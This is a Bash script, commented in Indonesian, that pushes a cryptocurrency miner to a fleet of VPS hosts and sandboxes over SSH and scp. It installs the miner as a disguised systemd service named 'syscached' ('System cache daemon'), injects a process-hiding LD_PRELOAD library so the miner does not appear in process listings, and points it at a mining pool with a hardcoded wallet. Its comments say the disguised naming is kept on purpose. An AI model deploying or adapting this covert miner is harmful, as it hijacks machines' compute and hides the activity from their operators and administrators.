#!/usr/bin/env bash
# deploy-conn-fleet.sh — sebar miner CONN (pool rplant rx/2b) ke fleet.
#
# Penamaan sengaja SAMA dengan setup lama: binary /usr/local/bin/xcb, unit
# systemd "syscached", worker = hostname. Tidak ada nama baru (connminer dll).
#
#   ./deploy-conn-fleet.sh vps                 # 4 VPS di daftar HOSTS
#   ./deploy-conn-fleet.sh sandbox             # 5 sandbox instabox
#   ./deploy-conn-fleet.sh vps 172.16.1.112    # host tertentu
#
# Prasyarat: ~/xcb-conn-pkg/{xcb,librandomx_v2.so,hideproc.so} (hasil build
# feat/conn-randomx-v2), dan ~/.instabox/env untuk sandbox.
#
# KOMPATIBILITAS glibc: binary hasil build di Ubuntu 24.04 (glibc 2.39)
# TIDAK jalan di Ubuntu 22.04 (glibc 2.35, GLIBCXX 3.4.30) — error
# "GLIBC_2.38 not found". Untuk target 22.04, build di salah satu host 22.04:
#   tar czf src.tgz src external/randomx-v2 external/RandomY external/FTXUI CMakeLists.txt
#   cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build -j4
#   gcc -O2 -fPIC -shared -o hideproc.so labs/process-hide/hideproc.c -ldl
# lalu salin build/xcb, build/external/randomx-v2/librandomx_v2.so, hideproc.so
# ke ~/xcb-conn-pkg di host kontrol.
set -uo pipefail
cd "$(dirname "$0")"
PKG="${PKG:-$HOME/xcb-conn-pkg}"
ADDR="${ADDR:-cc1p2mf0hyvm86vglrx6j3sq0hcxn7y8k2lt2fu8fzguv825j6epskxqtx8cmn}"
POOL="${POOL:-eu.rplant.xyz:17194}"
THREADS="${THREADS:-4}"
HOSTS_DEFAULT="172.16.0.218 172.16.1.112 172.16.2.183 172.16.6.205"
SANDBOXES_DEFAULT="analisa1 xcb2 xcb3 xcb4 xcb5"
MODE="${1:-vps}"

remote_install() {
  local worker=$1
  cat <<EOF
set -euo pipefail
sudo -n true
sudo install -m755 /tmp/xcbpkg/xcb /usr/local/bin/xcb
sudo install -m644 /tmp/xcbpkg/librandomx_v2.so /usr/local/bin/librandomx_v2.so
sudo install -m644 /tmp/xcbpkg/hideproc.so /usr/local/lib/hideproc.so
sudo tee /etc/systemd/system/syscache-hugepages.service >/dev/null <<"U"
[Unit]
Description=Hugepages for RandomX V2 dataset
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/usr/sbin/sysctl -w vm.nr_hugepages=1200 vm.max_map_count=262144
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
U
sudo tee /etc/systemd/system/syscached.service >/dev/null <<U
[Unit]
Description=System cache daemon
After=network-online.target syscache-hugepages.service
Wants=network-online.target syscache-hugepages.service

[Service]
Type=simple
ExecStart=/usr/local/bin/xcb -a conn --conn-pool $POOL -u $ADDR --worker $worker -t $THREADS --ui=log
Restart=always
RestartSec=10
LimitMEMLOCK=infinity
Environment=LD_PRELOAD=/usr/local/lib/hideproc.so

[Install]
WantedBy=multi-user.target
U
sudo systemctl daemon-reload
sudo systemctl enable syscached syscache-hugepages >/dev/null
sudo systemctl restart syscache-hugepages
sudo systemctl restart syscached
sleep 6
echo "svc=\$(systemctl is-active syscached)"
EOF
}

deploy_vps() {
  local host=$1 worker=$2
  echo "=== $host ($worker)"
  ssh -o BatchMode=yes -o ConnectTimeout=8 ubuntu@"$host" "mkdir -p /tmp/xcbpkg"
  scp -q "$PKG/xcb" "$PKG/librandomx_v2.so" "$PKG/hideproc.so" ubuntu@"$host":/tmp/xcbpkg/
  remote_install "$worker" | ssh -o BatchMode=yes ubuntu@"$host" "bash -s" 2>&1 | tail -2
}

deploy_sandbox() {
  local m=$1
  source "$HOME/.instabox/env"
  local ib="$HOME/.local/bin/instabox"
  echo "=== $m"
  for _ in 1 2 3 4 5; do
    out=$(cat "$PKG/pkg.b64" | "$ib" exec "$m" --stdin --env WORKER="$m" -- \
      "base64 -d > /tmp/p.tgz && rm -rf /tmp/pkg && mkdir -p /tmp/pkg && tar xzf /tmp/p.tgz -C /tmp/pkg && bash /tmp/pkg/san_install.sh" 2>&1)
    if echo "$out" | grep -q "Pool login OK"; then echo "$out" | tail -1; return 0; fi
    echo "  retry: $(echo "$out" | tail -1)"; sleep 8
  done
  return 1
}

case "$MODE" in
  vps)
    shift || true
    hosts=("$@"); [ ${#hosts[@]} -eq 0 ] && read -r -a hosts <<<"$HOSTS_DEFAULT"
    for h in "${hosts[@]}"; do deploy_vps "$h" "$(ssh -o BatchMode=yes -o ConnectTimeout=6 ubuntu@"$h" hostname 2>/dev/null || echo worker)"; done ;;
  sandbox)
    shift || true
    machines=("$@"); [ ${#machines[@]} -eq 0 ] && read -r -a machines <<<"$SANDBOXES_DEFAULT"
    for m in "${machines[@]}"; do deploy_sandbox "$m" || echo "GAGAL: $m"; done ;;
  *) echo "pakai: $0 vps|sandbox [target...]"; exit 2 ;;
esac
